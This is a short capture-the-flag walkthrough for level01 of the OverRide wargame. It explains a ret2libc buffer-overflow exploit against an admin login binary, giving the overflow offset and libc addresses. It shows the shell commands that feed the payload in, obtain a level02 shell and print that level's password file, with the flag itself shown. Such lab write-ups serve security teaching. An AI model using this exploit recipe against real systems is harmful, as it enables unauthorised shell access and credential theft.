# level01 walkthrough

## the binary
``` shell
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: admin
verifying username....

nope, incorrect username...
```

## methodology
- ret2libc attack

The first step involves finding the correct username, which will allow us to log in. It can be accessed from the <code>verify_user_name</code> function.
``` shell
(gdb) x/s 0x80486a8
0x80486a8:	 "dat_wil"
```
The <code>verify_user_pass</code> function gave us a suspected password, but since it doesn't work directly, we won't focus on it.
``` shell
(gdb) x/s 0x80486b0
0x80486b0:	 "admin"
```
Since the binary is vulnerable to buffer overflow, we use it to perform a ret2libc attack.
1. offset = 80 bytes ([Wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/))
2. <code>system</code> address = 0xf7e6aed0
3. <code>exit</code> address = 0xf7e5eb70
4. <code>/bin/sh</code> address = 0xf7f897ec

Our payload is generated using an attached script.

## flag
``` shell
level01@OverRide:~$ python /tmp/payload01.py > /tmp/flag1
level01@OverRide:~$ cat /tmp/flag1 - | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
